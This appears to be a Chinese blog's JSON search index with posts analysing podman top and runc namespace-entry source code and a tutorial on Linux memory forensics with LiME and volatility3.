可以看到，execSetns()会等cmd的Process执行完成后，从parentPipe中读取新进程的信息，并把新进程赋值给cmd，而这个新进程就是经过nsexec.c处理过的进程。这样，cmd中的进程就是在正确的namespace中的了。所以，在execSetns()中的Process.Wait()，等待的是nsexec.c的完成，nsexec.c执行完后，会自动交还执行权限，即init进程会往下执行。 runc&#x2F;libcontainer&#x2F;nsenter&#x2F;nsexec.c at 29222735a738a78a93a2879013c35fa899cb16b8 · opencontainers&#x2F;runc (github.com)","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"}],"tags":[]},{"title":"podman top 源码分析","slug":"podman-top-源码分析","date":"2023-12-24T07:59:15.000Z","updated":"2024-01-05T06:31:29.644Z","comments":true,"path":"2023/12/24/podman-top-源码分析/","link":"","permalink":"http://example.com/2023/12/24/podman-top-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"Toppodman&#x2F;libpod&#x2F;container_top_linux.go at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman (github.com) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586// Top gathers statistics about the running processes in a container. It returns a// []string for outputfunc (c *Container) Top(descriptors []string) ([]string, error) &#123; if c.config.NoCgroups &#123; return nil, fmt.Errorf(&quot;cannot run top on container %s as it did not create a cgroup: %w&quot;, c.ID(), define.ErrNoCgroups) &#125; conStat, err := c.State() if err != nil &#123; return nil, fmt.Errorf(&quot;unable to look up state for %s: %w&quot;, c.ID(), err) &#125; if conStat != define.ContainerStateRunning &#123; return nil, errors.New(&quot;top can only be used on running containers&quot;) &#125; // Also support comma-separated input. psgoDescriptors := []string&#123;&#125; for _, d := range descriptors &#123; for _, s := range strings.Split(d, &quot;,&quot;) &#123; if s != &quot;&quot; &#123; psgoDescriptors = append(psgoDescriptors, s) &#125; &#125; &#125; // If we encountered an ErrUnknownDescriptor error, fallback to executing // ps(1). This ensures backwards compatibility to users depending on ps(1) // and makes sure we&#x27;re ~compatible with docker. output, psgoErr := c.GetContainerPidInformation(psgoDescriptors) if psgoErr == nil &#123; return output, nil &#125; if !errors.Is(psgoErr, psgo.ErrUnknownDescriptor) &#123; return nil, psgoErr &#125; psDescriptors := descriptors if len(descriptors) == 1 &#123; // Note that the descriptors to ps(1) must be shlexed (see #12452). psDescriptors = make([]string, 0, len(descriptors)) shSplit, err := shlex.Split(descriptors[0]) if err != nil &#123; return nil, fmt.Errorf(&quot;parsing ps args: %w&quot;, err) &#125; for _, s := range shSplit &#123; if s != &quot;&quot; &#123; psDescriptors = append(psDescriptors, s) &#125; &#125; &#125; // Only use ps(1) from the host when we know the container was not started with CAP_SYS_PTRACE, // with it the container can access /proc/$pid/ files and potentially escape the container fs. if c.config.Spec.Process.Capabilities != nil &amp;&amp; !util.StringInSlice(&quot;CAP_SYS_PTRACE&quot;, c.config.Spec.Process.Capabilities.Effective) &#123; var retry bool output, retry, err = c.execPS(psDescriptors) if err != nil &#123; if !retry &#123; return nil, err &#125; logrus.Warnf(&quot;Falling back to container ps(1), could not execute ps(1) from the host: %v&quot;, err) output, err = c.execPSinContainer(psDescriptors) if err != nil &#123; return nil, fmt.Errorf(&quot;executing ps(1) in container: %w&quot;, err) &#125; &#125; &#125; else &#123; output, err = c.execPSinContainer(psDescriptors) if err != nil &#123; return nil, fmt.Errorf(&quot;executing ps(1) in container: %w&quot;, err) &#125; &#125; // Trick: filter the ps command from the output instead of // checking/requiring PIDs in the output. filtered := []string&#123;&#125; cmd := strings.Join(descriptors, &quot; &quot;) for _, line := range output &#123; if !strings.Contains(line, cmd) &#123; filtered = append(filtered, line) &#125; &#125; return filtered, nil&#125;","text":"Toppodman&#x2F;libpod&#x2F;container_top_linux.go at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman (github.com) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586// Top gathers statistics about the running processes in a container. It returns a// []string for outputfunc (c *Container) Top(descriptors []string) ([]string, error) &#123; if c.config.NoCgroups &#123; return nil, fmt.Errorf(&quot;cannot run top on container %s as it did not create a cgroup: %w&quot;, c.ID(), define.ErrNoCgroups) &#125; conStat, err := c.State() if err != nil &#123; return nil, fmt.Errorf(&quot;unable to look up state for %s: %w&quot;, c.ID(), err) &#125; if conStat != define.ContainerStateRunning &#123; return nil, errors.New(&quot;top can only be used on running containers&quot;) &#125; // Also support comma-separated input. psgoDescriptors := []string&#123;&#125; for _, d := range descriptors &#123; for _, s := range strings.Split(d, &quot;,&quot;) &#123; if s != &quot;&quot; &#123; psgoDescriptors = append(psgoDescriptors, s) &#125; &#125; &#125; // If we encountered an ErrUnknownDescriptor error, fallback to executing // ps(1). This ensures backwards compatibility to users depending on ps(1) // and makes sure we&#x27;re ~compatible with docker. output, psgoErr := c.GetContainerPidInformation(psgoDescriptors) if psgoErr == nil &#123; return output, nil &#125; if !errors.Is(psgoErr, psgo.ErrUnknownDescriptor) &#123; return nil, psgoErr &#125; psDescriptors := descriptors if len(descriptors) == 1 &#123; // Note that the descriptors to ps(1) must be shlexed (see #12452). psDescriptors = make([]string, 0, len(descriptors)) shSplit, err := shlex.Split(descriptors[0]) if err != nil &#123; return nil, fmt.Errorf(&quot;parsing ps args: %w&quot;, err) &#125; for _, s := range shSplit &#123; if s != &quot;&quot; &#123; psDescriptors = append(psDescriptors, s) &#125; &#125; &#125; // Only use ps(1) from the host when we know the container was not started with CAP_SYS_PTRACE, // with it the container can access /proc/$pid/ files and potentially escape the container fs. if c.config.Spec.Process.Capabilities != nil &amp;&amp; !util.StringInSlice(&quot;CAP_SYS_PTRACE&quot;, c.config.Spec.Process.Capabilities.Effective) &#123; var retry bool output, retry, err = c.execPS(psDescriptors) if err != nil &#123; if !retry &#123; return nil, err &#125; logrus.Warnf(&quot;Falling back to container ps(1), could not execute ps(1) from the host: %v&quot;, err) output, err = c.execPSinContainer(psDescriptors) if err != nil &#123; return nil, fmt.Errorf(&quot;executing ps(1) in container: %w&quot;, err) &#125; &#125; &#125; else &#123; output, err = c.execPSinContainer(psDescriptors) if err != nil &#123; return nil, fmt.Errorf(&quot;executing ps(1) in container: %w&quot;, err) &#125; &#125; // Trick: filter the ps command from the output instead of // checking/requiring PIDs in the output. filtered := []string&#123;&#125; cmd := strings.Join(descriptors, &quot; &quot;) for _, line := range output &#123; if !strings.Contains(line, cmd) &#123; filtered = append(filtered, line) &#125; &#125; return filtered, nil&#125; 默认情况下， podman-top 打印类似于 ps -ef 的数据，此时会进入函数GetContainerPidInformation GetContainerPidInformationpodman&#x2F;libpod&#x2F;container_top_linux.go at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman (github.com) 1234567891011121314151617181920212223242526// GetContainerPidInformation returns process-related data of all processes in// the container. The output data can be controlled via the `descriptors`// argument which expects format descriptors and supports all AIXformat// descriptors of ps (1) plus some additional ones to for instance inspect the// set of effective capabilities. Each element in the returned string slice// is a tab-separated string.//// For more details, please refer to github.com/containers/psgo.func (c *Container) GetContainerPidInformation(descriptors []string) ([]string, error) &#123; pid := strconv.Itoa(c.state.PID) // NOTE: psgo returns a [][]string to give users the ability to apply // filters on the data. We need to change the API here // to return a [][]string if we want to make use of // filtering. opts := psgo.JoinNamespaceOpts&#123;FillMappings: rootless.IsRootless()&#125; psgoOutput, err := psgo.JoinNamespaceAndProcessInfoWithOptions(pid, descriptors, &amp;opts) if err != nil &#123; return nil, err &#125; res := []string&#123;&#125; for _, out := range psgoOutput &#123; res = append(res, strings.Join(out, &quot;\\t&quot;)) &#125; return res, nil&#125; 在JoinNamespaceAndProcessInfoWithOptions获取容器的进程信息 JoinNamespaceAndProcessInfoWithOptionspodman&#x2F;vendor&#x2F;github.com&#x2F;containers&#x2F;psgo&#x2F;psgo.go at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889// JoinNamespaceAndProcessInfoWithOptions has the same semantics as ProcessInfo but joins// the mount namespace of the specified pid before extracting data from `/proc`.func JoinNamespaceAndProcessInfoWithOptions(pid string, descriptors []string, options *JoinNamespaceOpts) ([][]string, error) &#123; var ( data [][]string dataErr error wg sync.WaitGroup ) aixDescriptors, err := translateDescriptors(descriptors) if err != nil &#123; return nil, err &#125; ctx, err := contextFromOptions(options) if err != nil &#123; return nil, err &#125; // extract data from host processes only on-demand / when at least one // of the specified descriptors requires host data for _, d := range aixDescriptors &#123; if d.onHost &#123; ctx.hostProcesses, err = hostProcesses(pid) if err != nil &#123; return nil, err &#125; break &#125; &#125; wg.Add(1) go func() &#123; defer wg.Done() runtime.LockOSThread() // extract user namespaces prior to joining the mount namespace currentUserNs, err := proc.ParseUserNamespace(&quot;self&quot;) if err != nil &#123; dataErr = fmt.Errorf(&quot;error determining user namespace: %w&quot;, err) return &#125; pidUserNs, err := proc.ParseUserNamespace(pid) if err != nil &#123; dataErr = fmt.Errorf(&quot;error determining user namespace of PID %s: %w&quot;, pid, err) &#125; // join the mount namespace of pid fd, err := os.Open(fmt.Sprintf(&quot;/proc/%s/ns/mnt&quot;, pid)) if err != nil &#123; dataErr = err return &#125; defer fd.Close() // create a new mountns on the current thread if err = unix.Unshare(unix.CLONE_NEWNS); err != nil &#123; dataErr = err return &#125; if err := unix.Setns(int(fd.Fd()), unix.CLONE_NEWNS); err != nil &#123; dataErr = err return &#125; // extract all pids mentioned in pid&#x27;s mount namespace pids, err := proc.GetPIDs() if err != nil &#123; dataErr = err return &#125; // join the user NS if the pid&#x27;s user NS is different // to the caller&#x27;s user NS. joinUserNS := currentUserNs != pidUserNs ctx.containersProcesses, err = process.FromPIDs(pids, joinUserNS) if err != nil &#123; dataErr = err return &#125; data, dataErr = processDescriptors(aixDescriptors, ctx) &#125;() wg.Wait() return data, dataErr&#125; 在这段代码中，会让进程进入容器的mount namespace和pid namespace中，然后从容器的proc中获取进程的信息，放到data中，打印出来。 如果指定了未知的描述符，根据是否设置了CAP_SYS_PTRACE，分别进入容器中执行主机或者容器中的的ps命令。 比如执行podman top -l -- aux命令。 execPSpodman&#x2F;libpod&#x2F;container_top_linux.go at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// execute ps(1) from the host within the container pid namespacefunc (c *Container) execPS(psArgs []string) ([]string, bool, error) &#123; rPipe, wPipe, err := os.Pipe() if err != nil &#123; return nil, false, err &#125; defer rPipe.Close() outErrChan := make(chan error) stdout := []string&#123;&#125; go func() &#123; defer close(outErrChan) scanner := bufio.NewScanner(rPipe) for scanner.Scan() &#123; stdout = append(stdout, scanner.Text()) &#125; if err := scanner.Err(); err != nil &#123; outErrChan &lt;- err &#125; &#125;() psPath, err := exec.LookPath(&quot;ps&quot;) if err != nil &#123; wPipe.Close() return nil, true, err &#125; args := append([]string&#123;podmanTopCommand, strconv.Itoa(c.state.PID), psPath&#125;, psArgs...) cmd := reexec.Command(args...) cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123; Unshareflags: unix.CLONE_NEWNS, &#125; var errBuf bytes.Buffer cmd.Stdout = wPipe cmd.Stderr = &amp;errBuf // nil means use current env so explicitly unset all, to not leak any sensitive env vars cmd.Env = []string&#123;fmt.Sprintf(&quot;HOME=%s&quot;, os.Getenv(&quot;HOME&quot;))&#125; retryContainerExec := true err = cmd.Run() wPipe.Close() if err != nil &#123; exitError := &amp;exec.ExitError&#123;&#125; if errors.As(err, &amp;exitError) &#123; if exitError.ExitCode() != podmanTopExitCode &#123; // ps command failed err = fmt.Errorf(&quot;ps(1) failed with exit code %d: %s&quot;, exitError.ExitCode(), errBuf.String()) // ps command itself failed: likely invalid args, no point in retrying. retryContainerExec = false &#125; else &#123; // podman-top reexec setup fails somewhere err = fmt.Errorf(&quot;could not execute ps(1) in the container pid namespace: %s&quot;, errBuf.String()) &#125; &#125; else &#123; err = fmt.Errorf(&quot;could not reexec podman-top command: %w&quot;, err) &#125; &#125; if err := &lt;-outErrChan; err != nil &#123; return nil, retryContainerExec, fmt.Errorf(&quot;failed to read ps stdout: %w&quot;, err) &#125; return stdout, retryContainerExec, err&#125; 这段代码中，会启动一个新进程进入podmanTopInner，这个进程运行的ps的二进制文件是主机上的。 12345678910111213141516171819psPath, err := exec.LookPath(&quot;ps&quot;)if err != nil &#123; wPipe.Close() return nil, true, err&#125;args := append([]string&#123;podmanTopCommand, strconv.Itoa(c.state.PID), psPath&#125;, psArgs...)cmd := reexec.Command(args...)cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123; Unshareflags: unix.CLONE_NEWNS,&#125;var errBuf bytes.Buffercmd.Stdout = wPipecmd.Stderr = &amp;errBuf// nil means use current env so explicitly unset all, to not leak any sensitive env varscmd.Env = []string&#123;fmt.Sprintf(&quot;HOME=%s&quot;, os.Getenv(&quot;HOME&quot;))&#125;retryContainerExec := trueerr = cmd.Run() 在运行新进程时，包含了一个CLONE_NEWNS标志，这个进程会进入一个新的mount namespace中，并且设置了环境变量。 cmd.Env设置的为当前用户所在的目录，如果当前用户是root，则cmd.Env为&#x2F;root，如果用户是plucky，那么cmd.Env为&#x2F;home&#x2F;plucky。 在这个上下文中，代码通过将 cmd.Env 设置为只包含当前用户主目录的环境变量，确保了外部命令也就是cmd启动的新进程（podmanTopInner)在执行时只能访问到当前用户的主目录，而不会包含其他可能敏感的环境变量。 这种做法有助于确保在执行外部命令时，它只能访问到有限的环境信息，从而提高安全性。这对于涉及敏感信息或在高度安全性要求的环境中运行的程序来说是一种良好的实践。 podmanTopInnerpodman&#x2F;libpod&#x2F;container_top_linux.go at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100// podmanTopInner os.Args = &#123;command name&#125; &#123;pid&#125; &#123;psPath&#125; [args...]// We are rexxec&#x27;d in a new mountns, then we need to set some security settings in order// to safely execute ps in the container pid namespace. Most notably make sure podman and// ps are read only to prevent a process from overwriting it.func podmanTopInner() error &#123; if len(os.Args) &lt; 3 &#123; return fmt.Errorf(&quot;internal error, need at least two arguments&quot;) &#125; // We have to lock the thread as we a) switch namespace below and b) use PR_SET_PDEATHSIG // Also do not unlock as this thread should not be reused by go we exit anyway at the end. runtime.LockOSThread() if err := unix.Prctl(unix.PR_SET_PDEATHSIG, uintptr(unix.SIGKILL), 0, 0, 0); err != nil &#123; return fmt.Errorf(&quot;PR_SET_PDEATHSIG: %w&quot;, err) &#125; if err := unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0); err != nil &#123; return fmt.Errorf(&quot;PR_SET_DUMPABLE: %w&quot;, err) &#125; if err := unix.Prctl(unix.PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); err != nil &#123; return fmt.Errorf(&quot;PR_SET_NO_NEW_PRIVS: %w&quot;, err) &#125; if err := unix.Mount(&quot;none&quot;, &quot;/&quot;, &quot;&quot;, unix.MS_REC|unix.MS_PRIVATE, &quot;&quot;); err != nil &#123; return fmt.Errorf(&quot;make / mount private: %w&quot;, err) &#125; psPath := os.Args[2] // try to mount everything read only if err := unix.MountSetattr(0, &quot;/&quot;, unix.AT_RECURSIVE, &amp;unix.MountAttr&#123; Attr_set: unix.MOUNT_ATTR_RDONLY, &#125;); err != nil &#123; if err != unix.ENOSYS &#123; return fmt.Errorf(&quot;mount_setattr / readonly: %w&quot;, err) &#125; // old kernel without mount_setattr, i.e. on RHEL 8.8 // Bind mount the directories readonly for both podman and ps. psPath, err = remountReadOnly(psPath) if err != nil &#123; return err &#125; _, err = remountReadOnly(reexec.Self()) if err != nil &#123; return err &#125; &#125; // extra safety check make sure the ps path is actually read only err := unix.Access(psPath, unix.W_OK) if err == nil &#123; return fmt.Errorf(&quot;%q was not mounted read only, this can be dangerous so we will not execute it&quot;, psPath) &#125; pid := os.Args[1] // join the pid namespace of pid pidFD, err := os.Open(fmt.Sprintf(&quot;/proc/%s/ns/pid&quot;, pid)) if err != nil &#123; return fmt.Errorf(&quot;open pidns: %w&quot;, err) &#125; if err := unix.Setns(int(pidFD.Fd()), unix.CLONE_NEWPID); err != nil &#123; return fmt.Errorf(&quot;setns NEWPID: %w&quot;, err) &#125; pidFD.Close() args := []string&#123;psPath&#125; args = append(args, os.Args[3:]...) C.create_argv(C.int(len(args))) for i, arg := range args &#123; cArg := C.CString(arg) C.set_argv(C.int(i), cArg) defer C.free(unsafe.Pointer(cArg)) &#125; // Now try to close open fds except std streams // While golang open everything O_CLOEXEC it could still leak fds from // the parent, i.e. bash. In this case an attacker might be able to // read/write from them. // Do this as last step, it has to happen before to fork because the child // will be immediately in pid namespace so we cannot close them in the child. entries, err := os.ReadDir(&quot;/proc/self/fd&quot;) if err != nil &#123; return err &#125; for _, e := range entries &#123; i, err := strconv.Atoi(e.Name()) // IsFdInherited checks the we got the fd from a parent process and only close them, // when we close all that would include the ones from the go runtime which // then can panic because of that. if err == nil &amp;&amp; i &gt; unix.Stderr &amp;&amp; rootless.IsFdInherited(i) &#123; _ = unix.Close(i) &#125; &#125; // this function will always exit for us C.fork_exec_ps() return nil&#125; 这段代码会进入到c语言代码中，fork一个新进程执行ps命令。 fork_exec_pspodman&#x2F;libpod&#x2F;container_top_linux.c at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman (github.com) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/* We use cgo code here so we can fork then exec separately, this is done so we can mount proc after the fork because the pid namespace is only active after spawning children.*/voidfork_exec_ps ()&#123; int r, status = 0; pid_t pid; if (argv == NULL) &#123; fprintf (stderr, &quot;argv not initialized&quot;); exit (special_exit_code); &#125; pid = fork (); if (pid &lt; 0) &#123; fprintf (stderr, &quot;fork: %m&quot;); exit (special_exit_code); &#125; if (pid == 0) &#123; r = mount (&quot;proc&quot;, &quot;/proc&quot;, &quot;proc&quot;, 0, NULL); if (r &lt; 0) &#123; fprintf (stderr, &quot;mount proc: %m&quot;); exit (special_exit_code); &#125; /* use execve to unset all env vars, we do not want to leak anything into the container */ execve (argv[0], argv, NULL); fprintf (stderr, &quot;execve: %m&quot;); exit (special_exit_code); &#125; r = waitpid (pid, &amp;status, 0); if (r &lt; 0) &#123; fprintf (stderr, &quot;waitpid: %m&quot;); exit (special_exit_code); &#125; if (WIFEXITED (status)) exit (WEXITSTATUS (status)); if (WIFSIGNALED (status)) exit (128 + WTERMSIG (status)); exit (special_exit_code);&#125; execPSinContainerpodman&#x2F;libpod&#x2F;container_top_linux.go at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// execPS executes ps(1) with the specified args in the container via exec session.// This should be a bit safer then execPS() but it requires ps(1) to be installed in the container.func (c *Container) execPSinContainer(args []string) ([]string, error) &#123; rPipe, wPipe, err := os.Pipe() if err != nil &#123; return nil, err &#125; defer rPipe.Close() var errBuf bytes.Buffer streams := new(define.AttachStreams) streams.OutputStream = wPipe streams.ErrorStream = &amp;errBuf streams.AttachOutput = true streams.AttachError = true outErrChan := make(chan error) stdout := []string&#123;&#125; go func() &#123; defer close(outErrChan) scanner := bufio.NewScanner(rPipe) for scanner.Scan() &#123; stdout = append(stdout, scanner.Text()) &#125; if err := scanner.Err(); err != nil &#123; outErrChan &lt;- err &#125; &#125;() cmd := append([]string&#123;&quot;ps&quot;&#125;, args...) config := new(ExecConfig) config.Command = cmd ec, err := c.Exec(config, streams, nil) wPipe.Close() if err != nil &#123; return nil, err &#125; else if ec != 0 &#123; return nil, fmt.Errorf(&quot;runtime failed with exit status: %d and output: %s&quot;, ec, errBuf.String()) &#125; if logrus.GetLevel() &gt;= logrus.DebugLevel &#123; // If we&#x27;re running in debug mode or higher, we might want to have a // look at stderr which includes debug logs from conmon. logrus.Debugf(errBuf.String()) &#125; if err := &lt;-outErrChan; err != nil &#123; return nil, fmt.Errorf(&quot;failed to read ps stdout: %w&quot;, err) &#125; return stdout, nil&#125; 这段代码执行的是容器中的ps二进制文件。 在这段代码中会运行c.Exec,在podman exec中也会进入这部分代码，进入容器中执行ps命令。 podman top 安全分析","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"}],"tags":[]},{"title":"podman cp 源码分析","slug":"podman-cp-源码分析","date":"2023-12-24T07:57:14.000Z","updated":"2024-01-05T02:01:21.987Z","comments":true,"path":"2023/12/24/podman-cp-源码分析/","link":"","permalink":"http://example.com/2023/12/24/podman-cp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"调用链如上图所示。","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"}],"tags":[]},{"title":"学习 Linux 使用工具进行内存取证|LiME|volatility3","slug":"学习-Linux-使用工具进行内存取证-LiME-volatility3","date":"2023-12-22T07:34:00.000Z","updated":"2023-12-22T08:13:58.403Z","comments":true,"path":"2023/12/22/学习-Linux-使用工具进行内存取证-LiME-volatility3/","link":"","permalink":"http://example.com/2023/12/22/%E5%AD%A6%E4%B9%A0-Linux-%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-LiME-volatility3/","excerpt":"计算机的操作系统和应用使用主内存（RAM）来执行不同的任务。这种易失性内存包含大量关于运行应用、网络连接、内核模块、打开的文件以及几乎所有其他的内容信息，但这些信息每次计算机重启的时候都会被清除。 内存取证Memory forensics是一种从内存中找到和抽取这些有价值的信息的方式。Volatility 是一种使用插件来处理这类信息的开源工具。但是，存在一个问题：在你处理这些信息前，必须将物理内存转储到一个文件中，而 Volatility 没有这种能力。 因此，这篇文章分为两部分：","text":"计算机的操作系统和应用使用主内存（RAM）来执行不同的任务。这种易失性内存包含大量关于运行应用、网络连接、内核模块、打开的文件以及几乎所有其他的内容信息，但这些信息每次计算机重启的时候都会被清除。 内存取证Memory forensics是一种从内存中找到和抽取这些有价值的信息的方式。Volatility 是一种使用插件来处理这类信息的开源工具。但是，存在一个问题：在你处理这些信息前，必须将物理内存转储到一个文件中，而 Volatility 没有这种能力。 因此，这篇文章分为两部分： 第一部分是处理获取物理内存并将其转储到一个文件中。 第二部分使用 Volatility 从这个内存转储中读取并处理这些信息。 使用LiME获取内存并将其转储到一个文件中在开始分析内存之前，你需要一个内存转储供你使用。在实际的取证活动中，这可能来自一个被破坏或者被入侵的系统。这些信息通常会被收集和存储来分析入侵是如何发生的及其影响。由于你可能没有可用的内存转储，你可以获取你的测试 VM 的内存转储，并使用它来执行内存取证。 Linux 内存提取器Linux Memory Extractor（LiME）是一个在 Linux 系统上获取内存很常用的工具。使用以下命令获得 LiME： 1git clone https://github.com/504ensicsLabs/LiME.git 1cd LiME/src/ 构建LiME内核模块在 src 文件夹下运行 make 命令。这会创建一个以 .ko 为扩展名的内核模块。理想情况下，在 make 结束时，lime.ko 文件会使用格式 lime-&lt;your-kernel-version&gt;.ko 被重命名。 1make 加载内核模块现在是时候加载内核模块来获取系统内存了。insmod 命令会帮助加载内核模块；模块一旦被加载，会在你的系统上读取主内存（RAM）并且将内存的内容转储到命令行所提供的 path 目录下的文件中。另一个重要的参数是 format；保持 lime 的格式，如下所示。在插入内核模块之后，使用 lsmod 命令验证它是否真的被加载。 1lsmod | grep lime 12insmod ./lime-[内核版本].ko &quot;path=[内存镜像名称要存储的路径] format=lime&quot;insmod ./lime-6.2.0-39-generic.ko &quot;path=../mem format=lime&quot; 你应该看到给 path 命令的文件已经创建好了，而且文件大小与你系统的物理内存（RAM）大小相同（并不奇怪）。一旦你有了内存转储，你就可以使用 rmmod 命令删除该内核模块： 1du -sh mem 16G mem 1rmmod lime 内核转储中是什么这个内存转储文件只是原始数据，就像使用 file 命令可以看到的一样。你不可能通过手动去理解它；是的，在这里边有一些 ASCII 字符，但是你无法用编辑器打开这个文件并把它读出来。hexdump 的输出显示，最初的几个字节是 EmiL；这是因为你的请求格式在上面的命令行中是 lime： 1file mem mem: data 1hexdump -C mem | head 00000000 45 4d 69 4c 01 00 00 00 00 10 00 00 00 00 00 00 |EMiL…………|00000010 ff e7 09 00 00 00 00 00 00 00 00 00 00 00 00 00 |…………….|00000020 89 c6 05 09 00 00 00 ff e0 8d 86 48 00 00 00 89 |………..H….|00000030 86 40 00 00 00 8d 86 b0 00 00 00 89 86 32 00 00 |.@………..2..|00000040 00 0f 01 96 30 00 00 00 ff ae 40 00 00 00 66 90 |....0.....@…f.|00000050 20 00 b0 10 00 00 8d b4 26 00 00 00 00 8d 76 00 | …….&amp;…..v.|00000060 48 10 00 00 10 00 00 00 b8 18 00 00 00 8e d8 8e |H……………|00000070 c0 8e e0 8e e8 8e d0 0f 20 c0 25 ff ff ff 7f 0f |…….. .%…..|00000080 22 c0 0f 20 e0 83 e0 df 0f 22 e0 eb 00 b8 00 b0 |”.. …..”……|00000090 08 00 89 c4 b8 00 00 00 00 89 c5 b8 00 b0 08 00 |…………….| 获得 Volatility 并使用它来分析你的内存转储在你有了要分析的示例内存转储，使用下面的命令获取 Volatility 软件。Volatility 已经用 Python 3 重写了，但是本教程使用的是用 Python 2 写的原始的 Volatility 包。如果你想用 Volatility 3 进行实验，可以从合适的 Git 仓库下载它，并在以下命令中使用 Python 3 而不是 Python 2： 1git clone git@github.com:volatilityfoundation/volatility3.git 1python3 vol.py -h 下载内核调试符号使用第三方源安装 请确保已经导入系统的 GPG 密钥。对于 Ubuntu 16.04 及以上版本： 1sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C8CAB6595FDFF622 添加仓库配置 1234567codename=$(lsb_release -c | awk &#x27;&#123;print $2&#125;&#x27;) sudo tee /etc/apt/sources.list.d/ddebs.list &lt;&lt; EOF deb http://ddebs.ubuntu.com/ $&#123;codename&#125; main restricted universe multiverse deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiverse deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates main restricted universe multiverse deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverse EOF 更新安装包 1sudo apt-get update 安装调试符号包 1sudo apt-get install linux-image-$(uname -r)-dbgsym 包含调试信息的文件被称为 vmlinux-XXX，其中 XXX 是内核版本。安装完成后该文件存储在 /usr/lib/debug/boot 下。 dwarf2json下载 1git clone git@github.com:volatilityfoundation/dwarf2json.git 1go build 1./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-6.2.0-39-generic &gt; linux-image-6.2.0-39-generic.json 1cp linux-image-6.2.0-39-generic.json ~/volatility3/volatility3/symbols/linux volatility3以下是可用于volatility3的linux插件的示例，它并不完整，可能会添加更多插件。如需完整参考，请参阅 volatility 3 插件列表volatility3.plugins package — Volatility 3 2.5.2 documentation。对于插件请求，请创建一个问题并描述所请求的插件。 1python3 vol.py --help | grep -i linux. | head -n 5 使用插件 1python3 vol.py -f &lt;path to memory image&gt; &lt;plugin_name&gt; &lt;plugin_option&gt; 例子 banners1python3 vol.py -f ~/LiME/mem banners.Banners 上面的命令帮助我们找到内存转储的内核版本和发行版本。现在，使用上面的横幅，我们可以从 ISF 服务器搜索所需的 ISF 文件。Creating New Symbol Tables — Volatility 3 2.5.2 documentation如果找不到 ISF 文件，请按照为 Linux 创建符号表的过程中的说明进行操作。之后，将ISF文件放在 /volatility3/volatility3/symbols/linux 目录下。 Volatility 3 Framework 2.5.2Progress: 100.00 PDB scanning finishedOffset Banner 0x6da001a0 Linux version 6.2.0-39-generic (buildd@lcy02-amd64-045) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.4.0-1ubuntu122.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #4022.04.1-Ubuntu SMP PREEMPT_DYNAMIC (Ubuntu 6.2.0-39.4022.04.1-generic 6.2.16)0x6db75b80 Linux version 6.2.0-39-generic (buildd@lcy02-amd64-045) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.4.0-1ubuntu122.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #4022.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov 16 10:53:04 UTC 2 (Ubuntu 6.2.0-39.4022.04.1-generic 6.2.16)0x6fd5b8c0 Linux version 6.2.0-39-generic (buildd@lcy02-amd64-045) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.4.0-1ubuntu122.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #4022.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov 16 10:53:04 UTC 2 (Ubuntu 6.2.0-39.4022.04.1-generic 6.2.16)6)0x121d4fc98 Linux version 6.2.0-39-generic (buildd@lcy02-amd64-045) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.4.0-1ubuntu122.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #4022.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov 16 10:53:04 UTC 2 (Ubuntu 6.2.0-39.4022.04.1-generic 6.2.16) linux.pslist.PsList1python3 vol.py -f ~/LiME/mem linux.pslist.PsList 帮助我们列出正在运行的进程及其 PID 和 PPID Volatility 3 Framework 2.5.2Progress: 100.00 Stacking attempts finishedOFFSET (V) PID TID PPID COMM File output 0x8fbe402d4c80 1 1 0 systemd Disabled0x8fbe402d3300 2 2 0 kthreadd Disabled0x8fbe402d0000 3 3 2 rcu_gp 